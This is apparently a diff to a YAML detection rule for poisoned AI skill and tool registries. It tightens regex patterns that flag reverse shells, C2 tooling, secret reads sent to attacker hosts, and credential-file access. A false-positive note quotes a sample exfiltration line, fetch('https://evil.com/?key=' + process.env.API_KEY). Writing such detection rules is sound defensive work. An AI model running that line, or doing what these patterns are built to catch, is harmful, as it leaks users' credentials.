@@ -1,6 +1,6 @@
 title: Skill Registry Poisoning and Compromised Tool Distribution
 id: ATR-2026-00096
-rule_version: 1
+rule_version: 2
 status: draft
 description: >
   Detects supply chain attacks that target skill/tool registries and distribution channels. Attackers compromise
@@ -10,7 +10,7 @@ author: ATR Community (MiroFish Predicted)
 date: 2026/03/11
 schema_version: "0.1"
 detection_tier: pattern
-maturity: stable
+maturity: test
 severity: critical
 references:
   owasp_llm:
@@ -70,23 +70,20 @@ detection:
       description: Malicious execution hooks in install scripts from tool packages
     - field: tool_response
       operator: regex
-      value: (?i)\b(reverse.?shell|bind.?shell|meterpreter|cobalt.?strike|beacon|c2.?server|command.?and.?control)\b
-      description: Known malware/C2 framework references in tool response
+      value: '(?i)\b(reverse.?shell|bind.?shell|meterpreter|cobalt.?strike|c2.?server|command.?and.?control|beacon\s+(implant|payload|stager|config|dll)|(c2|malware|stager|implant|strike)\s+beacon)\b'
+      description: "Known malware/C2 framework references in tool response. The bare word beacon is NOT a trigger on its own - it is ordinary vocabulary (Ethereum Beacon Chain, web analytics beacons, navigator.sendBeacon), so it must be qualified by an adjacent malware term."
     - field: tool_response
       operator: regex
-      value: >-
-        (?i)(\bSocket\s*\(|net\.connect|new\s+WebSocket|XMLHttpRequest|fetch\s*\()\s*.{0,30}(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|attacker|evil|malicious|c2|ngrok)
-      description: Outbound network connections to suspicious destinations
+      value: '(?i)(\bSocket\s*\(|net\.connect|new\s+WebSocket|XMLHttpRequest|fetch\s*\()\s*.{0,30}(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b|attacker|evil|malicious|\bc2\b|ngrok)'
+      description: "Outbound network connections to suspicious destinations. c2 and the dotted quad are word-bounded so they cannot match inside a larger token (the unbounded form matched the c2 in header names such as X-aws-ec2-metadata-token)."
     - field: tool_response
       operator: regex
-      value: >-
-        (?i)(process\.env|os\.environ|System\.getenv|ENV\[)\s*.{0,10}(API.?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE.?KEY)
-      description: Environment variable access targeting secrets and credentials
+      value: '(?i)((process\.env|os\.environ|System\.getenv|ENV\[).{0,16}(API.?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE.?KEY).{0,60}(attacker|evil|malicious|exfil|\bc2\b|webhook\.site|ngrok|pastebin|\.onion|requestbin|burpcollab|\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)|(attacker|evil|malicious|exfil|\bc2\b|webhook\.site|ngrok|pastebin|\.onion|requestbin|burpcollab|\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b).{0,60}(process\.env|os\.environ|System\.getenv|ENV\[).{0,16}(API.?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE.?KEY)|(process\.env|os\.environ|System\.getenv|ENV\[).{0,16}(API.?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|PRIVATE.?KEY).{0,60}(fetch\s*\(|requests\.(post|put)|axios\.(post|put)|XMLHttpRequest|sendBeacon|\bcurl\b|\bwget\b|urlopen))'
+      description: "Environment variable secret access paired with an exfiltration sink. Reading a credential from the environment is by itself the CORRECT way to handle secrets and is what every auth/SDK document demonstrates, so it carries no attack signal on its own; the condition requires the read to sit next to an attacker-controlled destination (either order) or to be handed straight to an outbound send primitive."
     - field: tool_response
       operator: regex
-      value: >-
-        (?i)\b(fs\.read|open\s*\(|File\.read|readFile)\s*.{0,30}(\.ssh|id_rsa|\.aws|credentials|\.env|shadow|passwd|config\.json|secrets?\.)
-      description: Reading sensitive system files or credential stores
+      value: '(?i)\b(fs\.read|open\s*\(|File\.read|readFile)\s*.{0,30}(\.ssh|id_rsa|\.aws|credentials|\.env\b|/etc/shadow|/etc/passwd|secrets?\.)'
+      description: "Reading sensitive system files or credential stores. config.json was removed (reading an application config file is universal and carries no signal) and shadow/passwd are now path-qualified so they only match the system credential databases."
   condition: any
   false_positives:
     - Legitimate security audit tools that check for credential exposure
@@ -94,8 +91,13 @@ detection:
       Security scanning tools that report findings containing references to credential file paths like .ssh/id_rsa or
       .env in their vulnerability assessment output
     - >-
-      Documentation or educational content about supply chain security that mentions environment variable access
-      patterns like process.env and API_KEY in explanatory context
+      Defensive security documentation that quotes a complete exfiltration example verbatim (for instance a skill that
+      teaches detection and prints fetch('https://evil.com/?key=' + process.env.API_KEY) as the pattern to look for).
+      This shape is indistinguishable from the attack by pattern matching alone and is the residual false-positive
+      class after the 2026-08-04 tightening.
+    - >-
+      Penetration-testing and red-team skills whose prose legitimately names malware and C2 tooling (meterpreter,
+      Cobalt Strike, reverse shell, command and control) as subject matter rather than as payload
 response:
   actions:
     - block_input
